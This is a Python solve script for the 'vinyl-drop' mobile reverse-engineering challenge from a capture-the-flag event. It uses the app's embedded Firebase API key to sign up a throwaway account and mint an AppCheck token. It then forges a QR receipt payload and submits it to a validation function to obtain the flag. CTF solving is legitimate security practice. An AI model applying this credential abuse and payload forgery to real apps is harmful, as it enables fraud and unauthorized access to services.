#!/usr/bin/env python3
"""
Challenge: vinyl-drop
Category:  Mobile RE
Platform:  BSidesSF 2026
"""
import requests, time

API_KEY = "AIzaSyA9O-Hy1ySj7qL8Ntc6D5RoXjRxO_xHG1Q"
PROJECT_ID = "ctf-2026-fish"
APP_ID = "1:59012385614:android:b679cde719174f35acec1f"

# Step 1: Register a Firebase account
email = f"ctfplayer{int(time.time())}@test.com"
password = "CTFpassword123!"
r = requests.post(
    f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={API_KEY}",
    json={"email": email, "password": password, "returnSecureToken": True}
)
data = r.json()
id_token = data["idToken"]
uid = data["localId"]
print(f"[+] Registered {email}, UID: {uid}")

# Step 2: Mint AppCheck token (required by validateScanPayload)
r2 = requests.post(
    f"https://us-central1-{PROJECT_ID}.cloudfunctions.net/mintAppCheckToken",
    json={"appId": APP_ID},
    headers={"Content-Type": "application/json; charset=utf-8", "Authorization": f"Bearer {id_token}"}
)
app_check_token = r2.json()["token"]
print(f"[+] Got AppCheck token")

# Step 3: Forge QR payload: UID + receipt_total + current_timestamp
barcode_value = f"{uid}+136.48+{int(time.time())}"
print(f"[*] Forged payload: {barcode_value}")

# Step 4: Call validateScanPayload
r3 = requests.post(
    f"https://us-central1-{PROJECT_ID}.cloudfunctions.net/validateScanPayload",
    json={"data": {"value": barcode_value}},
    headers={
        "Content-Type": "application/json",
        "Authorization": f"Bearer {id_token}",
        "X-Firebase-AppCheck": app_check_token
    }
)
result = r3.json()
print(f"[*] Response: {result}")

if result.get("result", {}).get("success"):
    print(f"\n[+] FLAG: {result['result']['reward']}")
